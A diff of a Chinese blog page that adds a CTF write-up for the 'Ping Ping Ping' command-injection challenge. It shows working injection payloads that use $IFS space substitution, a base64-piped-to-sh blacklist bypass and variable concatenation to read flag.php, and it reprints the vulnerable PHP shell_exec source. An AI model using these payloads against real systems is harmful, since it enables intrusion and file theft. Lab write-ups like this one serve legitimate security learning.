@@ -176,7 +176,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-20 21:03:54" itemprop="dateModified" datetime="2021-04-20T21:03:54+08:00">2021-04-20</time>
+                <time title="修改时间：2021-04-20 22:28:43" itemprop="dateModified" datetime="2021-04-20T22:28:43+08:00">2021-04-20</time>
               </span>
 
           
@@ -247,6 +247,17 @@
 <p>管道连接符<code>|</code>可以正常使用，并且<code>ls</code>命令可以正常执行(ls看文件目录)，接下来查看根目录:<code>127.0.0.1 | ls /</code>,可以看到一个<code>flag</code>的文件，使用<code>cat</code>命令查看(cat命令是linux下的一个文本输出命令，通常是用于观看某个文件的内容的)：</p>
 <p><code>127.0.0.1 | cat /flag</code></p>
 <p>成功拿到flag</p>
+<h4 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h4><p>开始还是正常ping一下:<code>127.0.0.1</code>,回显正常，于是下一步还是用上一关的方式<code>127.0.0.1 | ls</code>，但是回显<code>/?ip= fxck your space!</code>也就是空格被过滤了，<code>$&#123;IFS&#125;</code> <code>$&#123;IFS&#125;$1</code> <code>$IFS$1</code>可以用来过滤空格，但是这一关只有第三个能成功过滤，一个<code>&#123;&#125;</code>也被过滤了</p>
+<p>构建payload:<code>?ip=127.0.0.1;cat$IFS$1index.php</code>或<code>?ip=127.0.0.1$IFS$1|$IFS$1cat$IFS$1index.php</code>可以成功拿到代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;&#x2F;\&amp;|\&#x2F;|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F; &#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;bash&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;.*f.*l.*a.*g.*&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a &#x3D; shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到很多符号被过滤了，包括<code>bash</code> <code>flag</code>等字符串，看完wp，过滤这关的黑名单要用到base64编码</p>
+<p>构建payload:<code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></p>
+<p><code>cat flag.php</code>经过base64加密后就是<code>Y2F0IGZsYWcucGhw</code>，sh估计和bash差不多，因为bash字符串被过滤，所以这里用的是sh，用base64编码绕过黑名单有两种方法，一种是|base64 -d|bash，另一种是|base64 -d`</p>
+<p>之后可以在网页源码里找到flag</p>
+<p>本关绕过黑名单还可以用拼接</p>
+<p>payload:<code>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code></p>
+<p><code>a=f</code> <code>a=l</code> <code>a=a</code>都拿不到flag，理解不了</p>
 
       
     </div>
